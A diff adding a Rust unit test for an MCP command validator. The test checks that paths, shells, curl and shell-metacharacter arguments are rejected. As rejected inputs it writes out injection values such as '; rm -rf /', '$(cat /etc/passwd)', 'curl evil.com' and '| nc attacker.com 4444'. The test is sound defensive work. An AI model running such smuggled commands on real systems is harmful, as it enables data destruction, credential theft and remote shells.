@@ -84,4 +84,32 @@ mod tests {
             assert!(!allowlist.contains(cmd), "{} should not be in MCP allowlist", cmd);
         }
     }
+
+    /// Verify the runtime MCP command validator rejects dangerous inputs
+    #[test]
+    fn test_mcp_runtime_validation() {
+        use crate::commands::mcp::validate_mcp_command;
+
+        // Allowed commands should pass
+        assert!(validate_mcp_command("npx", &["some-package".into()]).is_ok());
+        assert!(validate_mcp_command("node", &["server.js".into()]).is_ok());
+        assert!(validate_mcp_command("python3", &["-m".into(), "mymcp".into()]).is_ok());
+
+        // Paths must be rejected
+        assert!(validate_mcp_command("/bin/bash", &[]).is_err());
+        assert!(validate_mcp_command("./exploit", &[]).is_err());
+        assert!(validate_mcp_command("../hidden/cmd", &[]).is_err());
+        assert!(validate_mcp_command("C:\\Windows\\cmd.exe", &[]).is_err());
+
+        // Disallowed commands must be rejected
+        assert!(validate_mcp_command("bash", &[]).is_err());
+        assert!(validate_mcp_command("curl", &[]).is_err());
+        assert!(validate_mcp_command("sh", &[]).is_err());
+
+        // Arguments with shell metacharacters must be rejected
+        assert!(validate_mcp_command("npx", &["; rm -rf /".into()]).is_err());
+        assert!(validate_mcp_command("node", &["$(cat /etc/passwd)".into()]).is_err());
+        assert!(validate_mcp_command("python3", &["`curl evil.com`".into()]).is_err());
+        assert!(validate_mcp_command("npx", &["package".into(), "| nc attacker.com 4444".into()]).is_err());
+    }
 }
